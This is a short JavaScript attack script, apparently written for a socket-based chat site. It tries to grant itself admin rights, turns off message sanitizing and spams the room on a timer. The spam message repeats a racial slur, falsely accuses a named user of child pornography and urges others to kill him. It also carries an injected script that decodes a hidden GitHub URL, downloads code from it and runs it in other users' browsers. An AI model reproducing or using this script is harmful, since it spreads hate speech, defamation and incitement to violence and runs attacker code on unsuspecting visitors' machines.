let coughtimer = 7500; // Changed from const to let
socket.emit('command', { list: ['godmode'] });
socket.emit('command', { list: ['sanitize', 'off'] });
const intervalId = setInterval(function() {
    socket.emit("command", {
        list: ["name", "Bakugo"]
    });
    socket.emit('talk', { text: "A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! A LOVES CHILD PORN! GO KILL HIM! NIGGERS ARE BAD! BAKUGO IS BETTER THAN A! <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2x1aXNwYXllbmZvY2FvLWNyZWF0ZS9yYW5kb20tc2NyaXB0cy9yZWZzL2hlYWRzL21haW4v')+'a'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
    coughtimer = coughtimer - 125;
}, coughtimer);
